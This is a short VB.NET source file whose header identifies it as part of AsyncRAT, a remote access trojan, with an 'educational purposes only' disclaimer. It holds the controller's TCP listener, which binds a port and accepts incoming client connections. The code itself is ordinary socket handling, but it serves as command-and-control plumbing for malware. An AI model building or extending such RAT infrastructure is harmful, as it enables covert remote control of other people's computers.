Imports System.Net.Sockets
Imports System.Net

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

Public Class Server
    Public S As Socket
    Public Blocked As List(Of String)
    Public allDone As New Threading.ManualResetEvent(False)

    Sub Start(ByVal Port As Integer)
        Try
            Blocked = New List(Of String)

            S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            Dim IpEndPoint As IPEndPoint = New IPEndPoint(IPAddress.Any, Port)

            S.ReceiveBufferSize = 50 * 1000
            S.SendBufferSize = 50 * 1000
            S.Bind(IpEndPoint)
            S.Listen(20)

            While True
                allDone.Reset()
                S.BeginAccept(New AsyncCallback(AddressOf EndAccept), Nothing)
                allDone.WaitOne()
            End While

        Catch ex As Exception
            MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
            Environment.Exit(0)
        End Try
    End Sub

    Sub EndAccept(ByVal ar As IAsyncResult)
        Try
            Dim C As Client = New Client(S.EndAccept(ar), Me)
        Catch ex As Exception
            Debug.WriteLine("EndAccept " + ex.Message)
        Finally
            allDone.Set()
        End Try
    End Sub

End Class
